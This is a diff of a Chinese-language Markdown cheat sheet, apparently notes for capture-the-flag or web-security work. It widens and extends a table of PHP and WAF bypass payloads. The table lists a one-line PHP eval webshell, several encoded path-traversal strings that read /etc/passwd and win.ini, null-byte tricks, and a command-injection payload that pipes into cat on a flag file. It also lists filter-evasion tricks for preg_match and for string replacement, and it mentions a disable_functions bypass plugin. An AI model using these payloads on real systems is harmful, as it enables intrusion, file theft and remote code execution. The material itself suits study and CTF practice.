@@ -15,26 +15,28 @@
 [实战绕过某 WAF+拿 shell 组合拳](https://mp.weixin.qq.com/s/Q57dOjq279kqOFtSA1mV8Q)
 [webshell 检测算法实践](https://mp.weixin.qq.com/s/M4umpduFCI50zOO-5080cw)
 
-| bypass                          | payload                                                                                                                 | 解释                                           |
-| ------------------------------- | ----------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------- |
-| <?                              | `<script language="php">@eval($_POST['1']);</script>`                                                                   | PHP7 后不支持                                  |
-| %2F 代替/                       | ?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd                                                                              |                                                |
-| 二次编码(%25)                   | ?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd                                                                      |
-| 加入+                           | ?filename=.+./.+./bin/redacted.dll                                                                                      |
-| %00                             | ?filename=.%00./file.php <br>/etc/passwd%00.jpg                                                                         |
-| \                               | ?filename=..%5c..%5c/windows/win.ini                                                                                    |
-| is_numeric                      | is_numeric ('0xFFFF') 16 进制绕过                                                                                       |
-| 反码绕                          | urlencode(~'system');                                                                                                   |
-| xor bypass                      | bypass_xorshell.py                                                                                                      |
-| php\|strstr                     | 大小写绕过, strstri 才是大小写不敏感                                                                                    |
-| pathinfo                        | `filename/.`可以绕过 见 php_bypass_pathinfo.py                                                                          |
-| `$_POST['e_v.a.l]`              | `?e[v.a.l=123`                                                                                                          | `空格、+、[`会转为`_`, 存在`[`时后面不会被替换 |
-| `/[oc]:\d+:/i`                  | 1.[Link](#bypass-ocdi) 利用加号绕过（注意在 url 里传参时+要编码为%2B）<br> 2.利用数组对象绕过，如 serialize(array($a)); |
-| `eval(cmd.'givemegirlfriend!')` | `__halt_compiler();` 来结束 php 代码执行流程，绕过 givemegirlfriend!字符串的影响。                                      |
-| ---                             |
-| disable_function                | 蚁剑插件                                                                                                                |
-| --- bash ---                    |                                                                                                                         |
-| `ls / \|script xxx`             | 写文件                                                                                                                  |
+| bypass                                         | payload                                                                                                                 | 解释                                                                         |
+| ---------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- |
+| <?                                             | `<script language="php">@eval($_POST['1']);</script>`                                                                   | PHP7 后不支持                                                                |
+| %2F 代替/                                      | ?filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd                                                                              |                                                                              |
+| 二次编码(%25)                                  | ?filename=..%252F..%252F..%252F..%252Fetc%2Fpasswd                                                                      |
+| 加入+                                          | ?filename=.+./.+./bin/redacted.dll                                                                                      |
+| %00                                            | ?filename=.%00./file.php <br>/etc/passwd%00.jpg                                                                         |
+| \                                              | ?filename=..%5c..%5c/windows/win.ini                                                                                    |
+| is_numeric                                     | is_numeric ('0xFFFF') 16 进制绕过                                                                                       |
+| 反码绕                                         | urlencode(~'system');                                                                                                   |
+| replace                                        | 双写绕过                                                                                                                |
+| xor bypass                                     | bypass_xorshell.py                                                                                                      |
+| php\|strstr                                    | 大小写绕过, strstri 才是大小写不敏感                                                                                    |
+| pathinfo                                       | `filename/.`可以绕过 见 php_bypass_pathinfo.py                                                                          |
+| `$_POST['e_v.a.l]`                             | `?e[v.a.l=123`                                                                                                          | `空格、+、[`会转为`_`, 存在`[`时后面不会被替换                               |
+| `/[oc]:\d+:/i`                                 | 1.[Link](#bypass-ocdi) 利用加号绕过（注意在 url 里传参时+要编码为%2B）<br> 2.利用数组对象绕过，如 serialize(array($a)); |
+| `eval(cmd.'givemegirlfriend!')`                | `__halt_compiler();` 来结束 php 代码执行流程，绕过 givemegirlfriend!字符串的影响。                                      |
+| ---                                            |
+| disable_function                               | 蚁剑插件                                                                                                                |
+| --- bash ---                                   |                                                                                                                         |
+| `ls / \|script xxx`                            | 写文件                                                                                                                  |
+| `preg_match("/fi\|le\|flag/i", $_GET['file'])` | `?file=127.0.0.1 \| cat /fla[a-z]gggggg.txt`<br>`?file=f{i}l{e}:///fla{g}gggggg.txt`                                    | `[a-z]`可以绕过任意一个字母 <br> 大括号中只加入一个字符进行绕过，例如：{g}。 |
 
 ## bypass functions
 
